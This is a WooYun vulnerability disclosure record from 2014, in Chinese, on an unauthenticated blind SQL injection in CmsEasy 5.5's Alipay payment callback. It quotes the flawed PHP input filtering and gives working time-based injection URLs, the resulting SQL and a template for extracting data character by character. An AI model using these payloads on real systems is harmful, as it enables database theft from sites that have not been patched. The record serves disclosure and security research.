{"id": 48689, "wybug_id": "wooyun-2014-076669", "wybug_title": "cmseasy  再次绕过前台sql盲注(无需登录)", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-09-21 12:46", "wybug_open_date": "2014-12-20 12:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向公众公开  简要描述： cmseasy  再次绕过前台sql盲注(无需登录) 详细说明：  我们直接进入:archive_act.php:(611-628):\nfunction respond_action() {        include_once ROOT . '/lib/plugins/pay/' . front::$get['code'] . '.php';        $payclassname = front::$get['code'];        $payobj = new $payclassname();        $uri = $_SERVER[\"REQUEST_URI\"];        $__uriget = strstr($uri, '?');        $__uriget = str_replace('?', '', $__uriget);        $__uriget = explode('&', $__uriget);        $_GET = array();        foreach ($__uriget as $key => $val) {            $tmp = explode('=', $val);            $_GET[$tmp[0]] = $tmp[1];            if(preg_match('/\\'|select|union|\"/i', $tmp1)){            \texit('非法参数');            }        }        file_put_contents('logs11.txt', var_export($_GET,true));        $status = $payobj->respond();\n 然后 这个函数就流向了$payobj->respond()我们跟进去看看:alipay.php:(76-97):\nfunction respond() {        if (!empty($_POST)) {            foreach($_POST as $key =>$data) {                if(preg_match('/(=|<|>|\\')/', $data)){                    return false;                }                $_GET[$key] = $data;            }        }        $payment  = pay::get_payment($_GET['code']);        $seller_email = rawurldecode($_GET['seller_email']);        $order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);        $order_sn = trim($order_sn);        if (!pay::check_money($order_sn,$_GET['total_fee'])) {            return false;        }        if($_GET['trade_status'] == \"WAIT_SELLER_SEND_GOODS\"||$_GET['trade_status'] == \"TRADE_FINISHED\" || $_GET['trade_status'] == \"TRADE_SUCCESS\") {            pay::changeorders($order_sn,$_GET);            return true;        }else {            return false;        }\n这里有一个逻辑错误，就是判断post，如果存在就把post里面的参数全部复制给get，在赋值的过程中对其进行了特殊字符的转换，因为后续传递的参数都是来自$_GET，那我们直接就通过GET参数进行传参数，这里就直接绕过去了，而且这里传递过来的参数完全没有防御它过滤了什么呢，前面有一个一位已经说明： WooYun: CmsEasy最新版5.5_UTF-8_20140802绕过四次补丁继续SQL注入 这里就不赘述，但是修复后的逻辑错误仍然可以进行sql注入的盲注猜测除了以上所描述的，前台get参数不能输入什么1.空格2.=号由于这里后台执行的是一个select操作，举一个例子吧select * from table where a = '20140'由于mysql可以字符串和任何东西相乘法，我们就可以这样去触发一个条件查询select * from table where a = '20140'*(这里就是我们的条件判断)#'根据以上的思路我们发送url：http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818_new/uploads/index.php?case=archive&act=respond&code=alipay&out_trade_no=20140919161810-0'*if(ascii(substr((select/**/user()),1,1))in(114),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)#xxxxdddd执行一次我们看看效果，从后台抓取sql语句：SELECT * FROM `cmseasy_p_orders`  WHERE `id`='20140919161810-0%27*if(ascii(substr((select/**/user()),1,1))in(114),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)' ORDER BY 1 desc limit 1发现我们的#居然不见了，这个问题当然是浏览器url get请求的原因，他把后面当锚点了那么我们在编码一下url:http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818_new/uploads/index.php?case=archive&act=respond&code=alipay&out_trade_no=20140919161810-0'*if(ascii(substr((select/**/user()),1,1))in(114),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)%23xxxxdddd抓取sql后台查看:SELECT * FROM `cmseasy_p_orders`  WHERE `id`='20140919161810-0%27*if(ascii(substr((select/**/user()),1,1))in(114),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)%23xxxxdddd' ORDER BY 1 desc limit 1这里看到了吗，单引号，#号原封不动的encode，不过不要紧，浏览器默认做的事情，我们可以在后台curl发包，这里我直接用工具：\n\n这里请求当然也就成功延迟（7秒钟）执行，如果觉得不明显可以改大benchmark里面的数字我们抓取sql：SELECT * FROM `cmseasy_p_orders`  WHERE `id`='20140919161810-0'*if(ascii(substr((select/**/user()),1,1))in(114),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)#xxxxdddd' ORDER BY 1 desc limit 1这个成功执行了，那我们怎么猜测数据：'*if(ascii(substr((select/**/user()),1,1))in($NUM),benchmark(if(1,10000000,1),if(1,md5(1),1)),1)#xxxxdddd其中这个$NUM就是我们可以控制的ok!............................   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-21 18:27 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-21 15:02 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  厂商都被绕晕了。。。    \n     2014-09-21 19:11 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  厂商哭了...    \n     2014-09-21 19:50 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @君宝 给你了2rank    \n     2014-09-21 22:04 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  @menmen519  对啊 我哭了    \n     2014-09-25 10:59 |    \t\twcl17 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 业余找漏洞的。。。)\t\t \n  这种弱弱的cms产品就宣布停产好么。。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}